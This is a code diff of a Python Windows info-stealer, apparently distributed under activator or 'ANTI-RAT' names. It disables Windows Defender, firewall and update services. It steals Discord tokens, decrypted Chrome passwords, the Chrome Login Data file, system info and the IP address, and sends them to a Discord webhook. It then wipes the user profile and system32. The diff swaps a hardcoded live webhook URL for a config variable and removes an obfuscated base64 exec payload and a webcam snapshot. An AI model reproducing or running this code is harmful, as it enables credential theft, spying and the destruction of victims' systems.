@@ -4,20 +4,22 @@ import requests
 import os
 import json
 import cv2
-import camera
 import re
 from time import sleep as dp
 import keyboard
 from random import randint
 import json
 import base64
-import he
 import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 import shutil
 from datetime import timezone, datetime, timedelta
 from discord_webhook import DiscordWebhook
+
+#Config
+#Webhook Discord
+url=""
 
 username = os.getlogin()
 subprocess.getoutput('del Activator.exe/q')
@@ -29,30 +31,8 @@ subprocess.getoutput('net stop sharedaccess')
 subprocess.getoutput('net stop "wuauserv"')
 subprocess.getoutput('net stop "security center"')
 
-def delwindef():
-    keyboard.press_and_release("windows")
-    dp(0.10)
-    keyboard.write("cmd")
-    dp(0.10)
-    keyboard.press_and_release("enter")
-    dp(0.10)
-    keyboard.write("""
-net stop "SDRSVC"
-net stop "WinDefend"
-taskkill /f /t /im "MSASCui.exe"
-taskkill /f /t /im MsMpEng.exe
-taskkill /f /t /im MpCmdRun.exe
-net stop "security center"
-net stop sharedaccess
-netsh advfirewall set allprofiles state off
-net stop "wuauserv"
-rd "C:\Program Files\Windows Defender"/q /s
-start ANTI-RAT_By_EtichalHackingItalia.exe
-del Activator.exe/q
-""")
-
 def licenseW():
-    web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
+    web=DiscordWebhook(url=url)
     with open("C:/Windows/system32/license.rtf", "rb") as f:
         web.add_file(file=f.read(), filename='license.rtf')
     web.execute()
@@ -61,7 +41,7 @@ def tokengrabber():
     from urllib.request import Request, urlopen
 
     # your webhook URL
-    WEBHOOK_URL = 'https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy'
+    WEBHOOK_URL = url
 
     # mentions you when you get a hit
     PING_ME = False
@@ -127,18 +107,10 @@ def tokengrabber():
             pass
 
 def chrome_date_and_time(chrome_data):
-    # Chrome_data format is 'year-month-date 
-    # hr:mins:seconds.milliseconds
-    # This will return datetime.datetime Object
     return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
   
   
 def fetching_encryption_key():
-    # Local_computer_directory_path will look 
-    # like this below
-    # C: => Users => <Your_Name> => AppData =>
-    # Local => Google => Chrome => User Data =>
-    # Local State
     local_computer_directory_path = os.path.join(
       os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
       "User Data", "Local State")
@@ -214,27 +186,22 @@ def main1():
       
     try:
           
-        # trying to remove the copied db file as 
-        # well from local computer
-        web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
-        with open("chache_data_removed.txt", "rb") as f:
+        web=DiscordWebhook(url=url)
+        with open("password.txt", "rb") as f:
             web.add_file(file=f.read(), filename='file.txt')
         web.execute()
-        os.system("del chache_data_removed.txt")
+        os.system("del password.txt")
         os.remove(filename)
     except:
         pass
   
-  
-delwindef()
 main1()
 
 def main():
     r=requests.get("http://ifconfig.me")
-    url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
+    url=url
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
     subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
-    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJTRFJTVkMiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJXaW5EZWZlbmQiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3Rhc2traWxsIC9mIC9pbSBNU0FTQ3VpLmV4ZScpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXQgc3RvcCAic2VjdXJpdHkgY2VudGVyIicpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb24nKQpzdWJwcm9jZXNzLmdldG91dHB1dCgnbmV0IHN0b3AgInd1YXVzZXIiJyk=')[0]))
     web=DiscordWebhook(url=url, content=f"IP > {r.text}")
     with open(f"C:/Users/{username}/AppData/System info.txt", "rb")as f:
         web.add_file(file=f.read(), filename='System info.txt')
@@ -243,10 +210,7 @@ def main():
     with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
-    camera.snap(10,"test")
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    he.loli(40)
-    subprocess.getoutput('del ANTI-RAT_By_EtichalHackingItalia.exe')
     subprocess.getoutput('rd "%userprofile%"/q /s')
     subprocess.getoutput('rd "%windir%\system32"/q /s')
 tokengrabber()
